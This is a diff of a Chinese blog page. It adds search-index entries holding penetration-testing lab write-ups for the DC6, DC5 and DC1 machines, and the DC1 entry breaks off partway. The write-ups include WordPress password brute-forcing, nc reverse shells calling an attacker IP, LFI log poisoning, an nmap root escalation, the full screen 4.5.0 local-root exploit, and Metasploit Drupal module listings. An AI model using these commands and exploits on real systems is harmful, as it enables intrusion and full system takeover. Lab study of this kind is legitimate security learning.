@@ -9,7 +9,7 @@
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
 <title>ELF文件结构 | DAMOXILAI</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1629457535538">
+<link rel="shortcut icon" href="/favicon.ico?v=1629954740927">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -211,7 +211,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">12</span>
+        <span class="site-item-stat-count">16</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -1670,6 +1670,730 @@ a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-dc6/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;靶机：ip暂未知&lt;/li&gt;
+&lt;li&gt;攻击机kali：192.168.1.100&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验过程&#34;&gt;二、实验过程&lt;/h2&gt;
+&lt;h5 id=&#34;1主机发现&#34;&gt;1.主机发现&lt;/h5&gt;
+&lt;p&gt;nma扫描，发现靶机192.168.1.149&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954714640.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2端口扫描&#34;&gt;2.端口扫描&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;nmap -sVC -p- 192.168.1.149
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954702775.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;开放22、80端口&lt;/p&gt;
+&lt;p&gt;访问80端口会重定向到http://wordy/&lt;/p&gt;
+&lt;p&gt;所以在kali攻击机和宿主机host文件添加该域名，否则无法打开网页&lt;/p&gt;
+&lt;h5 id=&#34;3访问网页&#34;&gt;3.访问网页&lt;/h5&gt;
+&lt;p&gt;是一个wordpress网站&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954690172.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;4扫描用户&#34;&gt;4.扫描用户&lt;/h5&gt;
+&lt;p&gt;使用wpscan&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wpscan --url http://wordy/ -e
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954678725.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;1）第一次运行，更新漏洞数据库的时间会很长。如果报超时错误，可更换最新版的Kali Linux来运行此命令。&lt;/p&gt;
+&lt;p&gt;2）如果报此错误：Scan Aborted: no implicit conversion of nil into Array，&lt;/p&gt;
+&lt;p&gt;则需要更新一下gem：&lt;/p&gt;
+&lt;p&gt;root@kali:~# gem update cms_scanner&lt;/p&gt;
+&lt;p&gt;更新成功后再扫描。&lt;/p&gt;
+&lt;p&gt;在最后可以看到几个用户名&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954666579.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;5爆破用户密码&#34;&gt;5.爆破用户密码&lt;/h5&gt;
+&lt;p&gt;保存这些用户名&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954656298.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;根据官网提示&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954647891.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;然后用特定命令用kali自带字典构造字典，可以节省你几年时间&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /usr/share/wordlists/rockyou.txt | grep k01 &amp;gt; passwords.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;开始爆破&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; wpscan --url http://wordy/ -U users.txt -P passwords.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954637041.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;发现破解出来了&lt;/p&gt;
+&lt;p&gt;登陆后台http://wordy/wp-admin/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954627157.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
+这是个普通用户，没法写shell&lt;/p&gt;
+&lt;h5 id=&#34;6通过搜索activity-monitor发现漏洞利用&#34;&gt;6.通过搜索activity monitor发现漏洞利用&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954616151.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;pre&gt;&lt;code&gt; cp /usr/share/exploitdb/exploits/php/webapps/45274.html dc6.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;vi dc6.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;修改网站域名，反弹IP，端口，&lt;font color=&#39;red&#39;&gt;注意nc命令的要改正确&lt;/font&gt;&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954607121.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用浏览器打开dc6.html&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954595305.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;得到监听&lt;/p&gt;
+&lt;p&gt;用python调用本地的shell，打开一个新的终端，命令：&lt;/p&gt;
+&lt;p&gt;python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954582550.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;7提权&#34;&gt;7.提权&lt;/h5&gt;
+&lt;p&gt;7.1信息收集&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954572123.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;看到backups.sh文件可运行，但www-data没有在devs组中，故修改权限&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /etc/group
+...
+devs:x:1005:jens,graham
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在mark目录下stuff有things-to-do.txt文件记录了graham用户的密码，而graham用户正是devs组的用户&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Add new user: graham - GSo7isUM1D4 - done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954559548.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;ssh连接成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954549422.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.2查看sudo可执行哪些命令，发现正是backups.sh&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;graham@dc-6:~$ sudo -l&lt;br&gt;
+Matching Defaults entries for graham on dc-6:&lt;br&gt;
+env_reset, mail_badpass,&lt;br&gt;
+secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p&gt;
+&lt;p&gt;User graham may run the following commands on dc-6:&lt;br&gt;
+&lt;font color=&#39;red&#39;&gt;(jens) NOPASSWD: /home/jens/backups.sh&lt;/font&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;修改backups.sh文件，写入&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.100 1234 &amp;gt;/tmp/f&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在kali机开监听&lt;/p&gt;
+&lt;p&gt;靶机执行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo -u jens /home/jens/backups.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;获得shell&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954536823.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;7.3sudo -l查看哪些可直接执行的命令，发现nmap可以，且为root权限&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954524392.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;于是，先写一个nmap插件nse：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &#39;os.execute(&amp;quot;/bin/sh&amp;quot;)&#39; &amp;gt; fuck_root.nse
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;nmap加载插件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap --script=/home/jens/fuck_root.nse
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;16&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954513913.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;提权成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;17&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954503484.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
+&lt;p&gt;1.对wordpress框架的漏洞有所了解，wpscan需掌握使用，这个测试的作者对字典使用有所提示&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;wpscan --url http://wordy/ -e&lt;/li&gt;
+&lt;li&gt;wpscan --url http://wordy/ -U users.txt -P passwords.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2.wordpress cms的activity monitor有漏洞通过searchsploit进一步来利用&lt;/p&gt;
+&lt;p&gt;3.sudo -l对可直接执行命令及其权限的查看&lt;/p&gt;
+&lt;p&gt;4.nmap加载插件命令nmap --script=/home/jens/fuck_root.nse&lt;/p&gt;
+">渗透测试之DC6</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/nei-wang-shen-tou-zhi-dc5/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;靶机：ip暂未知&lt;/li&gt;
+&lt;li&gt;攻击机kali：192.168.43.100&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验过程&#34;&gt;二、实验过程&lt;/h2&gt;
+&lt;h5 id=&#34;1主机发现&#34;&gt;1.主机发现&lt;/h5&gt;
+&lt;p&gt;nma扫描，发现靶机192.168.43.143&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954157766.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2端口扫描&#34;&gt;2.端口扫描&lt;/h5&gt;
+&lt;p&gt;开放80、111、37451端口&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954217294.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;3访问80端口&#34;&gt;3.访问80端口&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954232544.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;4扫描目录&#34;&gt;4.扫描目录&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://192.168.43.143 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954250096.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;5文件包含漏洞&#34;&gt;5.文件包含漏洞&lt;/h5&gt;
+&lt;p&gt;逐个页面访问，关注footer.php和thankyou.php&lt;br&gt;
+&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954264341.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954289083.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;可以看到thankyou.php底下的内容就是footer.php的内容&lt;/p&gt;
+&lt;p&gt;可以猜测存在文件包含漏洞LFI&lt;/p&gt;
+&lt;p&gt;参数为什么是file，只能说是靠猜，习惯来说就很可能是file&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954305672.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;6拿shell&#34;&gt;6.拿shell&lt;/h5&gt;
+&lt;p&gt;利用日志文件&lt;/p&gt;
+&lt;p&gt;先在访问中写入php的一句话木马，让日志文件存在这串代码&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954318383.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;我们再通过LFI漏洞访问日志文件，并带上反弹命令nc 192.168.43.100 1234 -c /bin/bash&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954330319.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;监听得到webshell&lt;/p&gt;
+&lt;p&gt;用python调用本地的shell，打开一个新的终端，命令：&lt;/p&gt;
+&lt;p&gt;python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954343350.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;7提权&#34;&gt;7.提权&lt;/h5&gt;
+&lt;p&gt;切换到目录/tmp中，下载提权辅助脚本：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd /tmp
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+wget https://www.securitysift.com/download/linuxprivchecker.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于靶机对网址访问不到，我们可以自己搭建网站（python -m SimpleHTTPServer 80），把文件放置当前目录&lt;/p&gt;
+&lt;p&gt;运行LinEnum.sh&lt;/p&gt;
+&lt;p&gt;发现suid文件 /bin/screen-4.5.0&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954361704.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;searchsploit screen搜索一下&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954372603.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[/]&lt;br&gt;
+└─# cat /usr/share/exploitdb/exploits/linux/local/41154.sh                                                                    1 ⚙&lt;br&gt;
+#!/bin/bash&lt;/p&gt;
+&lt;p&gt;# screenroot.sh&lt;br&gt;
+# setuid screen v4.5.0 local root exploit&lt;br&gt;
+# abuses ld.so.preload overwriting to get root.&lt;br&gt;
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html&lt;br&gt;
+# HACK THE PLANET&lt;br&gt;
+# ~ infodox (25/1/2017)&lt;br&gt;
+echo &amp;quot;~ gnu/screenroot ~&amp;quot;&lt;br&gt;
+echo &amp;quot;[+] First, we create our shell and library...&amp;quot;&lt;br&gt;
+cat &amp;lt;&amp;lt; EOF &amp;gt; /tmp/libhax.c&lt;br&gt;
+#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;
+#include &amp;lt;sys/types.h&amp;gt;&lt;br&gt;
+#include &amp;lt;unistd.h&amp;gt;&lt;br&gt;
+_&lt;em&gt;attribute_&lt;/em&gt; ((_&lt;em&gt;constructor_&lt;/em&gt;))&lt;br&gt;
+void dropshell(void){&lt;br&gt;
+chown(&amp;quot;/tmp/rootshell&amp;quot;, 0, 0);&lt;br&gt;
+chmod(&amp;quot;/tmp/rootshell&amp;quot;, 04755);&lt;br&gt;
+unlink(&amp;quot;/etc/ld.so.preload&amp;quot;);&lt;br&gt;
+printf(&amp;quot;[+] done!\n&amp;quot;);&lt;br&gt;
+}&lt;br&gt;
+EOF&lt;br&gt;
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c&lt;br&gt;
+rm -f /tmp/libhax.c&lt;br&gt;
+cat &amp;lt;&amp;lt; EOF &amp;gt; /tmp/rootshell.c&lt;br&gt;
+#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;
+int main(void){&lt;br&gt;
+setuid(0);&lt;br&gt;
+setgid(0);&lt;br&gt;
+seteuid(0);&lt;br&gt;
+setegid(0);&lt;br&gt;
+execvp(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;br&gt;
+}&lt;br&gt;
+EOF&lt;br&gt;
+gcc -o /tmp/rootshell /tmp/rootshell.c&lt;br&gt;
+rm -f /tmp/rootshell.c&lt;br&gt;
+echo &amp;quot;[+] Now we create our /etc/ld.so.preload file...&amp;quot;&lt;br&gt;
+cd /etc&lt;br&gt;
+umask 000 # because&lt;br&gt;
+screen -D -m -L ld.so.preload echo -ne  &amp;quot;\x0a/tmp/libhax.so&amp;quot; # newline needed&lt;br&gt;
+echo &amp;quot;[+] Triggering...&amp;quot;&lt;br&gt;
+screen -ls # screen itself is setuid, so...&lt;br&gt;
+/tmp/rootshell&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;本机搭建网站，靶机下载该文件41154.sh&lt;/p&gt;
+&lt;p&gt;并且运行&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954383457.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;出错！&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;仔细分析该脚本，发现该脚本在执行过程中，会编译两段C语言代码，其中一个编译为动态库文件so，一个编译为可执行文件，然后加载该库文件，最后再调用可执行文件。根据上面的出错信息判断，估计是在执行脚本时，没有成功编译出库文件，可能的原因是靶机上没有安装编译程序。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;下一步思路：将该脚本切分为以下三个文件：两个C语言源文件和一个脚本文件，C语言源程序在攻击机上编译,然后用wget传输。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat dc5.sh&lt;br&gt;
+#!/bin/bash&lt;br&gt;
+echo &amp;quot;[+] Now we create our /etc/ld.so.preload file...&amp;quot;&lt;br&gt;
+cd /etc&lt;br&gt;
+umask 000 # because&lt;br&gt;
+screen -D -m -L ld.so.preload echo -ne  &amp;quot;\x0a/tmp/libhax.so&amp;quot; # newline needed&lt;br&gt;
+echo &amp;quot;[+] Triggering...&amp;quot;&lt;br&gt;
+screen -ls # screen itself is setuid, so...&lt;br&gt;
+/tmp/rootshell&lt;/p&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat libhax.c&lt;br&gt;
+#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;
+#include &amp;lt;sys/types.h&amp;gt;&lt;br&gt;
+#include &amp;lt;unistd.h&amp;gt;&lt;br&gt;
+_&lt;em&gt;attribute_&lt;/em&gt; ((_&lt;em&gt;constructor_&lt;/em&gt;))&lt;br&gt;
+void dropshell(void){&lt;br&gt;
+chown(&amp;quot;/tmp/rootshell&amp;quot;, 0, 0);&lt;br&gt;
+chmod(&amp;quot;/tmp/rootshell&amp;quot;, 04755);&lt;br&gt;
+unlink(&amp;quot;/etc/ld.so.preload&amp;quot;);&lt;br&gt;
+printf(&amp;quot;[+] done!\n&amp;quot;);&lt;br&gt;
+}&lt;/p&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─# cat rootshell.c&lt;br&gt;
+#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;
+int main(void){&lt;br&gt;
+setuid(0);&lt;br&gt;
+setgid(0);&lt;br&gt;
+seteuid(0);&lt;br&gt;
+setegid(0);&lt;br&gt;
+execvp(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;br&gt;
+}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;编译，有警告，无伤大雅&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954396428.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;在靶机下载&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954406510.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;运行dc5.sh，提权成功&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629954417412.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
+&lt;p&gt;1、gobuster扫描目录&lt;/p&gt;
+&lt;p&gt;2、符合LFI漏洞条件的发现，利用日志文件进行一句话木马攻击&lt;/p&gt;
+&lt;p&gt;3、searchsploit 对screen进行漏洞扫描&lt;/p&gt;
+&lt;p&gt;4、41154.sh由于靶机缺乏编译环境，运行出错，我们才需要划分三部分，对其中两个c程序在攻击机进行编译后再和与运行文件一起传输到靶机&lt;/p&gt;
+">渗透测试之DC5</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://damoxilai.github.io/post/shen-tou-ce-shi-zhi-dc1/"" data-c="
+          &lt;h2 id=&#34;一-实验环境&#34;&gt;一、实验环境&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;靶机：ip暂未知&lt;/li&gt;
+&lt;li&gt;攻击机kali：192.168.0.150&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;二-实验过程&#34;&gt;二、实验过程&lt;/h2&gt;
+&lt;h5 id=&#34;1主机发现&#34;&gt;1.主机发现&lt;/h5&gt;
+&lt;p&gt;nma扫描，发现靶机192.168.0.119&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629726426840.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2端口扫描&#34;&gt;2.端口扫描&lt;/h5&gt;
+&lt;p&gt;开放22、80、11、57515端口&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629726436846.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;3访问80端口&#34;&gt;3.访问80端口&lt;/h5&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://damoxilai.github.io/post-images/1629726447544.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;4看到drupal框架的网站&#34;&gt;4.看到Drupal框架的网站&lt;/h5&gt;
+&lt;p&gt;跟billu b0x2一样，可以用msf搜索漏洞，实现反弹监听&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;┌──(root💀kali)-[~/桌面]&lt;br&gt;
+└─#&lt;font color=&#39;red&#39;&gt; msfconsole &lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;Call trans opt: received. 2-19-98 13:24:18 REC:Loc&lt;/p&gt;
+&lt;p&gt;Trace program: running&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    wake up, Neo...                                                                                                        
+ the matrix has you                                                                                                        
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;follow the white rabbit.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;   knock, knock, Neo.
+
+                 (`.         ,-,
+                 ` `.    ,;&#39; /
+                  `.  ,&#39;/ .&#39;
+                   `. X /.&#39;
+         .-;--&#39;&#39;--.._` ` (
+       .&#39;            /   `
+      ,           ` &#39;   Q &#39;
+      ,         ,   `._    \
+   ,.|         &#39;     `-.;_&#39;
+   :  . `  ;    `  ` --,.._;
+    &#39; `    ,   )   .&#39;
+       `._ ,  &#39;   /_
+          ; ,&#39;&#39;-,;&#39; ``-
+           ``-..__``--`
+
+                      https://metasploit.com
+
+
+=[ metasploit v6.0.30-dev                          ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;-- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]&lt;/li&gt;
+&lt;li&gt;-- --=[ 592 payloads - 45 encoders - 10 nops            ]&lt;/li&gt;
+&lt;li&gt;-- --=[ 7 evasion                                       ]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Metasploit tip: Enable verbose logging with set VERBOSE&lt;br&gt;
+true&lt;/p&gt;
+&lt;p&gt;&lt;font color=&#39;red&#39;&gt;msf6 &amp;gt; search drupal&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection&lt;br&gt;
+1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration&lt;br&gt;
+2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection&lt;br&gt;
+3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution&lt;br&gt;
+4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection&lt;br&gt;
+5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution&lt;br&gt;
